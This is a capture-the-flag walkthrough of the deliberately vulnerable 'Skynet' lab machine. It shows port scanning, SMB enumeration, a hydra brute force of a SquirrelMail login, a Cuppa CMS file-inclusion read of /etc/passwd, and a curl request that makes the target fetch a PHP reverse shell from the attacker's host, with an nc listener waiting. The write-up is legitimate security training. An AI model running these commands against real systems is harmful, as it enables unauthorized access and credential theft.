#Linux #SMB  # 

skynet: A vulnerable Terminator themed Linux machine


NMAP Scan

```sh
  nmap -sV -sC -p- 10.10.14.219
  ```
* To see the versions of the services running (-sV)
* To perform a script scan using the default set of scripts (-sC)
* To scan all ports from 1 through 65535 (-p-)

OPEN PORTS

* 22/tcp  open  ssh
* 80/tcp  open  http
* 110/tcp open  pop3
* 139/tcp open  netbios-ssn
* 143/tcp open  imap
* 445/tcp open  microsoft-ds (SMB)

We start with Port 80/tcp. The HTML code does not shown anything interesting, the buttons do not work.  

![image](https://user-images.githubusercontent.com/99097743/170730299-698d3ae3-81c2-48dc-89db-eca62bddbfa1.png)

![image](https://user-images.githubusercontent.com/99097743/170730467-87b64da3-0597-40fd-8b33-55fa10cc4027.png)

Let's move on the 'hidden" directories, Gobuster can help us locate them:

```sh
gobuster dir -u=http://10.10.14.219 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![image](https://user-images.githubusercontent.com/99097743/170731438-021c0087-aea6-46a2-8c6a-3cb0c93ba632.png)

This analysis takes a while. The following directories were listed in the first few minutes:

* /admin (Status 301)
* /css (Status 301)
* /js (Status 301)
* /config (Status 301)
* /ai (Satus 301)
* /squirrelmail (Status 301) -- Check this out!
* /server-status

![image](https://user-images.githubusercontent.com/99097743/170733365-d1597c75-3cac-4cb0-a7b8-0e3402861fd6.png)

**Searchsploit** suggests that there is no vulnerability documented for **SquirrelMail version 1.4.23**

![image](https://user-images.githubusercontent.com/99097743/170743722-89617c7d-6878-4ec2-b530-1676178865ba.png)

OK, Let's switch to Port 445/tcp - SMB server. We can try the **enum4linux** for enumerating information.


```sh
  enum4linux -a 10.10.14.219
  ```
* To do all simple enumerations (-a)

There are interesting results such as the known usernames:

![image](https://user-images.githubusercontent.com/99097743/170734669-57ec1e84-403f-4464-a5a9-6c62c66ebe0b.png)


Here are the sharenames:

![image](https://user-images.githubusercontent.com/99097743/170734874-50cb0cc9-7a02-484e-a69e-1e9aa92a5772.png)


We can use the **smbclient** to enter the anonymous share.


```sh
  smbclient '\\10.10.48.162\anonymous'
  
  # If you need to enter share with a username
  smbclient -U milesdyson '\\10.10.246.55\milesdyson'
  
  ```
  
 We captured a number of log files -- one of which includes a password list for the email account: **milesdyson**. 
 
 Let's use **hydra** for brute-forcing the email account 
 
 ```sh
 hydra -l milesdyson -P log1.txt 10.10.48.162 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect" -V -F -u
```
![image](https://user-images.githubusercontent.com/99097743/170764972-17fd4f81-db5a-40c1-862f-6014aa37ce7c.png)

We now have access to the email account!

![image](https://user-images.githubusercontent.com/99097743/170765416-03b102ff-c975-4637-a994-d061991061c4.png)

There is a Samba Password Reset email providing a new password. We can use the credentials to login the SMB share and see that there is a document, entitled important.txt. Here, it reveals the 'hidden directory'. Gobuster suggests that there is another hidden directry as /administrator, please see the figure below. 

![image](https://user-images.githubusercontent.com/99097743/170796322-835a1ab6-695b-442d-b8d6-5b48d7cfc906.png)

Now, let's go to **searchsploit** and search if there is any vulnerability documented for Cuppa CMS:

![image](https://user-images.githubusercontent.com/99097743/170797721-4e0caa91-3458-4107-b093-7957aedb4788.png)


```sh
  searchsploit -m php/webapps/25971.txt
  #VULNERABILITY: PHP CODE INJECTION
  An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
  
  # We basically include the following link:
  /alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
  
  so the full URL becomes:
  http://10.10.246.55/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

  ```

Now, we can work on the reverse shell:

STEP 1: Generate the Reverse Shell and save it on the local host (Here, it is called RS.php)

![image](https://user-images.githubusercontent.com/99097743/170798516-8239f698-5ea1-4fb9-9d05-7ad32868babe.png)


STEP 2: Open up an HTTP server to transfer the payload to the target machine

```sh
  sudo python3 -m http.server 80
  ```
![image](https://user-images.githubusercontent.com/99097743/170799511-a9cb1b0c-3cb8-49e2-8aa6-af2d5cc0eff9.png)

STEP 3: Turn on the listener
```sh
sudo nc -lvnp 87
 ```
 
 ![image](https://user-images.githubusercontent.com/99097743/170799539-6d6f535a-4de8-41f8-8860-5bfe58f86896.png)


STEP 3: Modify the PHP Injection URL:

```sh
http://10.10.246.55/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://
  ```
  
STEP 4: Upload the PHP file from the localhost using the HTTP server and invoke the listener

```sh
curl  http://10.10.246.55/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.123.93:80/RS.php
  ```

Niceeee!! it works:

![image](https://user-images.githubusercontent.com/99097743/170799708-ca8f61e3-ba39-462a-b38d-c67ea5661769.png)

Let's stabilize the shell!

